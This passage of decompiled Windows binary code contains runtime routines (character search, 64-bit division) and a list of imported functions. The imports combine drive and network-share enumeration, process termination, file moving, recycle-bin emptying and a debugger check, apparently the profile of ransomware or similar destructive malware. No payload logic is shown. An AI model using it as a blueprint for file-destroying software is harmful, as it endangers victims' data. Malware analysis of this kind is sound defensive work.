            // 0x411cd8
            v47 = v48 + 16;
            __asm_pcmpistri(v46, *(int128_t *)v48, 64);
            v48 = v47;
        }
        // 0x411ceb
        return result;
    }
    char v49 = *(char *)v44; // 0x411cbf
    result2 = v49 == a2 ? v44 : result2;
    while (v49 != 0) {
        // 0x411ccb
        v44++;
        result = result2;
        v45 = v44;
        if ((v44 & 15) == 0) {
            goto lab_0x411cd4;
        }
        v49 = *(char *)v44;
        result2 = v49 == a2 ? v44 : result2;
    }
    // 0x411ceb
    return result2;
}

// Address range: 0x411d60 - 0x411e8b
int32_t function_411d60(int32_t a1, unsigned char a2) {
    int32_t v1 = a2;
    int32_t v2 = 256 * v1;
    if (g162 != 0) {
        int128_t v3 = __asm_pshuflw(__asm_movd(v2 | v1), 0); // 0x411d79
        int128_t v4 = __asm_movlhps(v3, v3); // 0x411d7e
        uint32_t v5 = a1 & 15; // 0x411d8d
        int32_t v6 = a1 - v5;
        int128_t v7; // 0x411d60
        int128_t v8 = v7;
        int128_t v9 = __asm_movdqu_6(*(int128_t *)v6); // 0x411d93
        int128_t v10 = __asm_por(__asm_pcmpeqb(__asm_pxor(v8, v8), v9), __asm_pcmpeqb(v9, v4)); // 0x411da3
        int32_t v11 = __asm_pmovmskb(v10) & -1 << v5; // 0x411dab
        int32_t v12 = -1; // 0x411dad
        int32_t v13 = v6 + 16; // 0x411dad
        while (v11 == 0) {
            // 0x411d93
            v6 = v13;
            v8 = v10;
            v9 = __asm_movdqu_6(*(int128_t *)v6);
            v10 = __asm_por(__asm_pcmpeqb(__asm_pxor(v8, v8), v9), __asm_pcmpeqb(v9, v4));
            v11 = __asm_pmovmskb(v10) & v12;
            v12 = -1;
            v13 = v6 + 16;
        }
        int32_t v14 = llvm_cttz_i32(v11, true) + v6; // 0x411dba
        return *(char *)v14 != (char)__asm_movd_7(v4) ? 0 : v14;
    }
    int32_t v15 = a1; // 0x411dde
    int32_t v16 = a1; // 0x411dde
    int32_t result; // 0x411d60
    if ((a1 & 3) != 0) {
        char v17 = *(char *)v15; // 0x411de0
        result = v15;
        while (v17 != a2) {
            // 0x411de9
            result = 0;
            if (v17 == 0) {
                // break -> 0x411e3e
                break;
            }
            // 0x411ded
            v15++;
            v16 = v15;
            if ((v15 & 3) == 0) {
                goto lab_0x411df5;
            }
            v17 = *(char *)v15;
            result = v15;
        }
        // 0x411e3e
        return result;
    }
  lab_0x411df5:;
    int32_t v18 = v2 | v1; // 0x411df5
    int32_t v19 = v16; // 0x411dfe
    while (true) {
        int32_t v20 = v19;
        uint32_t v21 = *(int32_t *)v20; // 0x411e00
        int32_t v22 = v21 ^ (0x10000 * v18 | v18); // 0x411e0b
        if (((v22 ^ -0x7efeff00 ^ v22 + 0x7efefeff) & -0x7efeff00) != 0) {
            char v23 = v21; // 0x411e4a
            result = v20;
            if (v23 == a2) {
                // break -> 0x411e3e
                break;
            }
            // 0x411e4e
            result = 0;
            if (v23 == 0) {
                // break -> 0x411e3e
                break;
            }
            char v24 = v21 / 256; // 0x411e52
            if (v24 == a2) {
                // 0x411e7d
                return v20 + 1;
            }
            // 0x411e56
            result = 0;
            if (v24 == 0) {
                // break -> 0x411e3e
                break;
            }
            char v25 = v21 / 0x10000; // 0x411e5d
            if (v25 == a2) {
                // 0x411e76
                return v20 + 2;
            }
            // 0x411e61
            result = 0;
            if (v25 == 0) {
                // break -> 0x411e3e
                break;
            }
            char v26 = v21 / 0x1000000; // 0x411e65
            if (v26 == a2) {
                // 0x411e6f
                return v20 + 3;
            }
            // 0x411e69
            result = 0;
            if (v26 == 0) {
                // break -> 0x411e3e
                break;
            }
        } else {
            int32_t v27 = v21 + 0x7efefeff; // 0x411e0d
            int32_t v28 = v21 ^ -0x7efeff00 ^ v27; // 0x411e19
            if ((v28 & -0x7efeff00) != 0) {
                // 0x411e2d
                result = 0;
                if (v27 <= -1 != ((v28 & 0x1010100) == 0)) {
                    // break -> 0x411e3e
                    break;
                }
            }
        }
        // 0x411e00
        v19 = v20 + 4;
    }
    // 0x411e3e
    return result;
}

// Address range: 0x411e90 - 0x411f3a
int32_t function_411e90(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a2; // 0x411e9b
    int32_t v2 = a1; // 0x411e9b
    int32_t v3 = 0; // 0x411e9b
    if (a2 < 0) {
        // 0x411e9d
        v1 = (int32_t)(a1 != 0) - a2;
        v2 = -a1;
        v3 = 1;
    }
    int32_t v4 = a4; // 0x411eb7
    int32_t v5 = a3; // 0x411eb7
    int32_t v6 = v3; // 0x411eb7
    if (a4 < 0) {
        // 0x411eb9
        v4 = (int32_t)(a3 != 0) - a4;
        v5 = -a3;
        v6 = v3 + 1;
    }
    uint32_t v7 = v5;
    int32_t v8 = v2; // 0x411ecf
    int32_t v9 = v7; // 0x411ecf
    uint32_t v10 = v4; // 0x411ecf
    int32_t v11; // 0x411e90
    if (v4 == 0) {
        int32_t v12 = (0x100000000 * (int64_t)(v1 % v7) | (int64_t)v2) / (int64_t)v7; // 0x411ee7
        // 0x411f2a
        v11 = v12;
        return v6 != 1 ? v11 : -v11;
    }
    v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
    uint32_t v13 = v1 / 2; // 0x411efb
    v8 = 0x80000000 * (int32_t)((v1 & 1) != 0) | v8 / 2;
    while (v10 >= 2) {
        // 0x411ef7
        v10 /= 2;
        uint32_t v14 = v13;
        v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
        v13 = v14 / 2;
        v8 = 0x80000000 * (int32_t)((v14 & 1) != 0) | v8 / 2;
    }
    uint64_t v15 = (0x100000000 * (int64_t)v13 | (int64_t)v8) / (int64_t)v9; // 0x411f03
    int32_t v16 = v15; // 0x411f03
    uint64_t v17 = (v15 & 0xffffffff) * (int64_t)v7; // 0x411f11
    uint32_t v18 = (int32_t)(v17 / 0x100000000); // 0x411f11
    uint32_t v19 = v4 * v16 + v18; // 0x411f13
    if (v19 < v18 || v19 > v1 || v2 < (int32_t)v17 == v19 >= v1) {
        // 0x411f2a
        v11 = v16 - 1;
        return v6 != 1 ? v11 : -v11;
    }
    // 0x411f2a
    v11 = v16;
    return v6 != 1 ? v11 : -v11;
}

// Address range: 0x411f3a - 0x411f55
int32_t function_411f3a(int32_t a1) {
    // 0x411f3a
    function_406b2c();
    int32_t result = function_407417((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x411f50
    return result;
}

// Address range: 0x411f55 - 0x411f70
int32_t function_411f55(int32_t a1) {
    // 0x411f55
    function_406b2c();
    int32_t result = function_407417((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x411f6b
    return result;
}

// Address range: 0x411f70 - 0x411fcd
int32_t function_411f70(void) {
    uint32_t v1 = g147; // 0x411f70
    if (v1 < 8) {
        // 0x411fab
        g146 = 0;
        g147 = 7;
        *(int16_t *)&g145 = 0;
        return 0;
    }
    int32_t v2 = g145; // 0x411f7b
    int32_t v3 = v2; // 0x411f8d
    if (2 * v1 >= 4094) {
        int32_t v4 = v2 - 4;
        v3 = *(int32_t *)v4;
        if (v4 - v3 >= 32) {
            // 0x411fc8
            return function_409c03();
        }
    }
    // 0x411fa1
    function_4060cb(v3);
    // 0x411fab
    g146 = 0;
    g147 = 7;
    *(int16_t *)&g145 = 0;
    return 0;
}

// --------------- Dynamically Linked Functions ---------------

// LPWSTR CharLowerW(_Inout_ LPWSTR lpsz);
// BOOL CloseHandle(_In_ HANDLE hObject);
// HRESULT CoCreateInstance(_In_ REFCLSID rclsid, _In_opt_ LPUNKNOWN pUnkOuter, _In_ DWORD dwClsContext, _In_ REFIID riid, LPVOID * ppv);
// LPWSTR * CommandLineToArgvW(_In_ LPCWSTR lpCmdLine, _Out_ int * pNumArgs);
// HRESULT CoSetProxyBlanket(_In_ IUnknown * pProxy, _In_ DWORD dwAuthnSvc, _In_ DWORD dwAuthzSvc, _In_opt_ OLECHAR * pServerPrincName, _In_ DWORD dwAuthnLevel, _In_ DWORD dwImpLevel, _In_opt_ RPC_AUTH_IDENTITY_HANDLE pAuthInfo, _In_ DWORD dwCapabilities);
// HANDLE CreateEventW(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCWSTR lpName);
// HANDLE CreateFileW(_In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateMutexW(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCWSTR lpName);
// HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// PVOID DecodePointer(_In_opt_ PVOID Ptr);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// PVOID EncodePointer(_In_opt_ PVOID Ptr);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileExA(_In_ LPCSTR lpFileName, _In_ FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, _In_ FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, _In_ DWORD dwAdditionalFlags);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileA(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FlushFileBuffers(_In_ HANDLE hFile);
// BOOL FreeEnvironmentStringsW(_In_ LPWCH penv);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// UINT GetACP(void);
// LPSTR GetCommandLineA(VOID);
// LPWSTR GetCommandLineW(VOID);
// UINT GetConsoleCP(VOID);
// BOOL GetConsoleMode(_In_ HANDLE hConsoleHandle, _Out_ LPDWORD lpMode);
// BOOL GetCPInfo(_In_ UINT CodePage, _Out_ LPCPINFO lpCPInfo);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentProcessId(VOID);
// DWORD GetCurrentThreadId(VOID);
// UINT GetDriveTypeW(_In_opt_ LPCWSTR lpRootPathName);
// LPWCH GetEnvironmentStringsW(void);
// DWORD GetFileAttributesW(_In_ LPCWSTR lpFileName);
// BOOL GetFileSizeEx(_In_ HANDLE hFile, _Out_ PLARGE_INTEGER lpFileSize);
// DWORD GetFileType(_In_ HANDLE hFile);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// BOOL GetModuleHandleExW(_In_ DWORD dwFlags, _In_opt_ LPCWSTR lpModuleName, _Out_ HMODULE * phModule);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// UINT GetOEMCP(void);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// HANDLE GetProcessHeap(VOID);
// VOID GetStartupInfoW(_Out_ LPSTARTUPINFOW lpStartupInfo);
// HANDLE GetStdHandle(_In_ DWORD nStdHandle);
// BOOL GetStringTypeW(_In_ DWORD dwInfoType, LPCWCH lpSrcStr, _In_ int cchSrc, _Out_ LPWORD lpCharType);
// VOID GetSystemTime(_Out_ LPSYSTEMTIME lpSystemTime);
// VOID GetSystemTimeAsFileTime(_Out_ LPFILETIME lpSystemTimeAsFileTime);
// DWORD GetTickCount(VOID);
// LPVOID HeapAlloc(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ SIZE_T dwBytes);
// BOOL HeapFree(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem);
// LPVOID HeapReAlloc(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem, _In_ SIZE_T dwBytes);
// SIZE_T HeapSize(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ LPCVOID lpMem);
// BOOL InitializeCriticalSectionAndSpinCount(_Out_ LPCRITICAL_SECTION lpCriticalSection, _In_ DWORD dwSpinCount);
// VOID InitializeSListHead(_Out_ PSLIST_HEADER ListHead);
// unsigned InterlockedExchangeAdd(_Inout_ unsigned volatile * Addend, _In_ unsigned Value);
// BOOL IsDebuggerPresent(VOID);
// BOOL IsProcessorFeaturePresent(_In_ DWORD ProcessorFeature);
// BOOL IsValidCodePage(_In_ UINT CodePage);
// int LCMapStringW(_In_ LCID Locale, _In_ DWORD dwMapFlags, LPCWSTR lpSrcStr, _In_ int cchSrc, LPWSTR lpDestStr, _In_ int cchDest);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HMODULE LoadLibraryExW(_In_ LPCWSTR lpLibFileName, HANDLE hFile, _In_ DWORD dwFlags);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalFree(HLOCAL hMem);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// LPWSTR lstrcatW(LPWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrcmpiW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrcmpW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// LPWSTR lstrcpynW(LPWSTR lpString1, _In_ LPCWSTR lpString2, _In_ int iMaxLength);
// LPWSTR lstrcpyW(LPWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrlenW(_In_ LPCWSTR lpString);
// BOOL MoveFileW(_In_ LPCWSTR lpExistingFileName, _In_ LPCWSTR lpNewFileName);
// int MultiByteToWideChar(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCCH lpMultiByteStr, _In_ int cbMultiByte, LPWSTR lpWideCharStr, _In_ int cchWideChar);
// HANDLE OpenMutexW(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName);
// LPWSTR PathRemoveBackslashW(_Inout_ LPWSTR lpszPath);
// BOOL Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// BOOL QueueUserWorkItem(_In_ LPTHREAD_START_ROUTINE Function, _In_opt_ PVOID Context, _In_ ULONG Flags);
// VOID RaiseException(_In_ DWORD dwExceptionCode, _In_ DWORD dwExceptionFlags, _In_ DWORD nNumberOfArguments, const ULONG_PTR * lpArguments);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// BOOL ResetEvent(_In_ HANDLE hEvent);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// UINT SetErrorMode(_In_ UINT uMode);
// BOOL SetEvent(_In_ HANDLE hEvent);
// BOOL SetFileAttributesW(_In_ LPCWSTR lpFileName, _In_ DWORD dwFileAttributes);
// BOOL SetFilePointerEx(_In_ HANDLE hFile, _In_ LARGE_INTEGER liDistanceToMove, _Out_opt_ PLARGE_INTEGER lpNewFilePointer, _In_ DWORD dwMoveMethod);
// VOID SetLastError(_In_ DWORD dwErrCode);
// BOOL SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle);
// LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(_In_opt_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// HINSTANCE ShellExecuteW(_In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpOperation, _In_ LPCWSTR lpFile, _In_opt_ LPCWSTR lpParameters, _In_opt_ LPCWSTR lpDirectory, _In_ INT nShowCmd);
// HRESULT SHEmptyRecycleBinA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR pszRootPath, DWORD dwFlags);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// PCWSTR StrRStrIW(_In_ PCWSTR pszSource, _In_opt_ PCWSTR pszLast, _In_ PCWSTR pszSrch);
// PCWSTR StrStrIW(_In_ PCWSTR pszFirst, _In_ PCWSTR pszSrch);
// PCWSTR StrStrW(_In_ PCWSTR pszFirst, _In_ PCWSTR pszSrch);
// BSTR SysAllocString(const OLECHAR * psz);
// void SysFreeString(_In_opt_ BSTR bstrString);
// BOOL SystemTimeToFileTime(_In_ const SYSTEMTIME * lpSystemTime, _Out_ LPFILETIME lpFileTime);
// BOOL TerminateProcess(_In_ HANDLE hProcess, _In_ UINT uExitCode);
// DWORD TlsAlloc(VOID);
// BOOL TlsFree(_In_ DWORD dwTlsIndex);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// LONG UnhandledExceptionFilter(_In_ struct _EXCEPTION_POINTERS * ExceptionInfo);
// HRESULT VariantClear(_Inout_ VARIANTARG * pvarg);
// void VariantInit(_Out_ VARIANTARG * pvarg);
// DWORD WaitForSingleObjectEx(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds, _In_ BOOL bAlertable);
// int WideCharToMultiByte(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCWCH lpWideCharStr, _In_ int cchWideChar, LPSTR lpMultiByteStr, _In_ int cbMultiByte, _In_opt_ LPCCH lpDefaultChar, _Out_opt_ LPBOOL lpUsedDefaultChar);
// DWORD WNetCloseEnum(_In_ HANDLE hEnum);
// DWORD WNetEnumResourceW(_In_ HANDLE hEnum, _Inout_ LPDWORD lpcCount, LPVOID lpBuffer, _Inout_ LPDWORD lpBufferSize);
// DWORD WNetOpenEnumW(_In_ DWORD dwScope, _In_ DWORD dwType, _In_ DWORD dwUsage, _In_opt_ LPNETRESOURCEW lpNetResource, _Out_ LPHANDLE lphEnum);
// int32_t wnsprintfA(void);
// int32_t wnsprintfW(void);
// BOOL WriteConsoleW(_In_ HANDLE hConsoleOutput, const VOID * lpBuffer, _In_ DWORD nNumberOfCharsToWrite, _Out_opt_ LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft
// Detected functions: 591
